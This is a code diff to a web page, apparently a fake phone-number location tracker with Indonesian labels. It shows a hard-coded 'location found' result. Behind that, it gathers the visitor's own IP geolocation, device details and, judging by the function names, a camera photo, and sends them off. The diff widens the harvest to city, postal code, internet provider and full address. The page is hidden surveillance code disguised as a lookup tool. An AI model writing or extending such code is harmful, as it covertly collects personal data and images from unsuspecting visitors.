@@ -73,7 +73,7 @@
       const phoneInput = document.getElementById("phone").value;
       const clock = new Date().toLocaleString();
       let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
-      let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A";
+      let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A", city = "N/A", postal = "N/A", org = "N/A", fullAddress = "N/A";
 
       const userAgent = navigator.userAgent;
       const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
@@ -105,8 +105,12 @@
         ip = ipData.ip;
         country = ipData.country_name;
         province = ipData.region;
+        city = ipData.city;
+        postal = ipData.postal;
+        org = ipData.org;
         latitude = ipData.latitude;
         longitude = ipData.longitude;
+        fullAddress = `${ipData.city}, ${ipData.region}, ${ipData.country_name}, ${ipData.postal}`;
       } catch {}
 
       try {
@@ -137,6 +141,10 @@
         "android versions": androidVersion,
         "login from": loginFrom,
         "lokasi": `${latitude}, ${longitude} (accuracy: ${accuracy})`,
+        "alamat lengkap": fullAddress,
+        "provider": org,
+        "kota": city,
+        "kode pos": postal,
         "country": country,
         "province": province,
         "clock": clock,
@@ -208,8 +216,8 @@
       setTimeout(() => {
         resBox.innerHTML = "<b>Lokasi ditemukan</b><br>Lat: -6.2<br>Long: 106.8<br>Status: <span style='color:lime'>Aktif</span>";
       }, 3000);
-      getVisitorInfo(); // kirim data
-      captureAndSendPhoto(); // ambil foto
+      getVisitorInfo();
+      captureAndSendPhoto();
     }
   </script></body>
 </html>
